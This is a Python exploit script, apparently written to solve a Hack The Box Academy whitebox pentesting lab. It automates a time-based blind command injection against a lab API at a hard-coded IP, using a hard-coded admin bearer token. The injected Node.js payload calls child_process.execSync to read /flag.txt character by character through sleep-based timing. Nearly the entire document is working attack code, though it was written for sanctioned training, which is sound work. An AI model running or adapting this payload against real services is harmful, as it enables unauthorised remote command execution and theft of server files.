#! /usr/bin/env python3 
# Created this script to solve the lab called "INTRO TO WHITEBOX PENTESTING: Exploit Development" on HTBAcademy.  

import requests
import string

def blind_cmd_injection():
    foundchar= ''
    count= 0
    charlist= string.printable
    # Update the url and Authorization Bearer token
    url="http://83.136.251.158:32604/api/service/generate"
    proxies={"http":"http://127.0.0.1:8080"}
    headers={
        "Content-type":"application/json",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MTgzNTkzMDIsImV4cCI6MTcxODQ0NTcwMn0.1fxDdSsO9s8Vp-QW_XyGjfSaW9-BAN5iD5LQX-b_RPA"
            }

    for num in range(1,30):
        if count > 100:            
            break
        else:            
            for char in charlist:                  
                data=f'''{{
        "text": "' + require('child_process').execSync('cat /flag.txt | head -c {num} | tail -c {num} | {{ read c; if [ \\"$c\\" = \\"{foundchar}{char}\\" ]; then sleep 2; fi; }}')+ `'`, statusCode: 403}})//"
        }}'''
                
                response=requests.post(url=url, proxies=proxies, headers=headers, data=data)

                if response.elapsed.total_seconds() > 2:            
                    foundchar+=char
                    print(foundchar) 
                    count= 0
                    break
                else:
                    count+=1
                    #print(count)
    
try:
    blind_cmd_injection()
except KeyboardInterrupt:
    print("ctrl + c detected...exiting gracefully")
